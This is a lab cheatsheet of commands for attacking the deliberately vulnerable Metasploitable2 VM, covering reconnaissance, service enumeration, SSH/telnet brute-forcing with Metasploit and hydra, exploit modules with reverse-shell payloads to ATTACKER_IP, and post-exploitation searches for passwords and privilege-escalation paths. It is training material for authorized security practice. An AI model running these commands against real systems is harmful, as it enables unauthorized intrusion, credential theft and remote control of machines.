Metasploitable2 Lab — Commands Cheatsheet
Use in an isolated, authorized lab only. Replace ATTACKER_IP / TARGET_IP with your lab IPs. Keep snapshots before each test.

0. Tips

Use -Pn with nmap inside VMs to skip host discovery.

Record terminal sessions with script for evidence: script ~/evidence/TARGET_IP_session.log.

Sanitize outputs before publishing (remove real IPs/creds).

1. Reconnaissance (discover hosts & services)
# Quick port + version scan (save output)
nmap -Pn TARGET_IP -p- -sV -oN nmap_full.txt

# Target single service with version detection
nmap -Pn TARGET_IP -p 21,22,23,80,8080 -sV -oN nmap_services.txt

# Banner grab with netcat (quick)
nc -vn TARGET_IP 21

# HTTP headers
curl -I http://TARGET_IP/

# Host key fingerprint (SSH)
ssh-keyscan -t rsa TARGET_IP

2. Enumeration (dig into services)
# FTP: try anonymous
ftp TARGET_IP
# then: Name: anonymous | Password: <enter>

# HTTP directory brute force (dirb)
dirb http://TARGET_IP/ /usr/share/wordlists/dirb/common.txt -o dirb_results.txt

# Gobuster (faster dir brute force)
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt

# Nikto web scan
nikto -h http://TARGET_IP/ -output nikto_http.txt

# SMB enumeration
enum4linux -a TARGET_IP
smbclient -L //TARGET_IP -N

# PostgreSQL discovery (scripts)
nmap -Pn TARGET_IP -p 5432 --script=pgsql-info -oN pg_recon.txt

# distcc discovery
nmap -Pn TARGET_IP -p 3632 -sV -oN distcc_recon.txt

# VNC discovery
nmap -Pn TARGET_IP -p 5900-5905 -sV -oN vnc_recon.txt

3. Credential attacks / brute-force (use responsibly)
# Prepare small wordlists (example)
cat > ~/ssh_users.txt <<'USERS'
msfadmin
root
admin
user
USERS

cat > ~/ssh_pass.txt <<'PASSES'
msfadmin
password
123456
toor
PASSES

Using Metasploit auxiliary scanners
# SSH brute force (msf)
sudo msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS TARGET_IP
set RPORT 22
set USER_FILE /root/ssh_users.txt
set PASS_FILE /root/ssh_pass.txt
set THREADS 10
set STOP_ON_SUCCESS true
run

# Telnet brute force (msf)
use auxiliary/scanner/telnet/telnet_login
set RHOSTS TARGET_IP
set RPORT 23
set USER_FILE /root/ssh_users.txt
set PASS_FILE /root/ssh_pass.txt
set THREADS 10
set STOP_ON_SUCCESS true
run

Hydra (alternative)
hydra -L ~/ssh_users.txt -P ~/ssh_pass.txt ssh://TARGET_IP -t 4
hydra -L ~/ssh_users.txt -P ~/ssh_pass.txt telnet://TARGET_IP -t 4

4. Exploitation (common lab examples)

Metasploit module pattern: use exploit/<platform>/<service>/<name> → show options → set RHOSTS TARGET_IP → other options → exploit

# vsftpd 2.3.4 backdoor (FTP)
sudo msfconsole -q
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET_IP
set RPORT 21
set PAYLOAD cmd/unix/interact
exploit

# Tomcat manager WAR deploy (if manager accessible)
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS TARGET_IP
set RPORT 8080
set HTTPUSERNAME tomcat
set HTTPPASSWORD tomcat
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
exploit

# PHP CGI Arg Injection (HTTP)
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS TARGET_IP
set RPORT 80
set LHOST ATTACKER_IP
set LPORT 4444
set PAYLOAD php/meterpreter/reverse_tcp
exploit

5. Post‑Exploitation (enumeration, privilege checks)

Run inside obtained shell/session:

# Basic info
whoami
id
uname -a
cat /etc/os-release
hostname
ip a

# Processes & network
ps aux | head
ss -tuln

# Sudo & possible escalation
sudo -l
find / -perm -4000 -type f 2>/dev/null | head

# Search for credentials/configs
grep -R "password" /var/www /home /etc -n 2>/dev/null

# Check scheduled tasks
crontab -l 2>/dev/null
ls -la /etc/cron.*

# Quick web config search
grep -R "DB_PASS" /var/www -n 2>/dev/null

Cleanup & Restore
# Kill msf sessions
# In msfconsole:
sessions -l
sessions -k <id>

# Kill listeners (example netcat)
ps aux | grep nc
kill <pid>

# Remove uploaded files on target (if any)
ssh user@TARGET_IP 'rm -f /var/lib/tomcat*/webapps/webshell.jsp'

# Stop packet captures
pkill tshark

# Revert to snapshot (VirtualBox example; run on host)
# VBoxManage snapshot "<VM_NAME>" restore "<snapshot_name>"
# or use hypervisor UI: Snapshots → Restore

# Quick verify after revert
nmap -Pn TARGET_IP -p 21,22,23,80,8080 -sV

9. Quick msfconsole handy commands
# Start quietly
sudo msfconsole -q

# Search modules
search vsftpd
search tomcat

# Show module options
show options

# Set & run
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set LPORT 4444
exploit

# Manage sessions
sessions -l          # list
sessions -i <id>     # interact
sessions -k <id> 
